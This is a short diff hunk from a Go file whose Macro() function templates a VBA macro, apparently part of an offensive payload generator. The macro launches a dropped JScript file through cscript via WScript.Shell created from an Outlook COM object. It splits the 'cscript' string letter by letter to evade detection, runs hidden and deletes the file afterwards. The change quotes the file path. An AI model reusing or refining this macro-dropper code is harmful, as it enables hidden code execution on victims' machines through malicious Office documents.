@@ -468,7 +468,7 @@ func Macro() string {
     End If
     {{.Variables.Full}} = {{.Variables.pathOfFile}} & {{.Variables.storeIn}}
     Set {{.Variables.obj}} = GetObject("new:0006F03A-0000-0000-C000-000000000046")
-	{{.Variables.obj}}.CreateObject("WScript.Shell").Run("c" & "s" & "c" & "r" & "i" & "p" & "t" & " //E:jscript " & {{.Variables.Full}}), 0
+	{{.Variables.obj}}.CreateObject("WScript.Shell").Run("c" & "s" & "c" & "r" & "i" & "p" & "t" & " //E:jscript " & """" & {{.Variables.pathOfFile}} & {{.Variables.storeIn}} & """"), 0
 	{{.Variables.sleep}}
 	Kill {{.Variables.Full}}
 End Sub
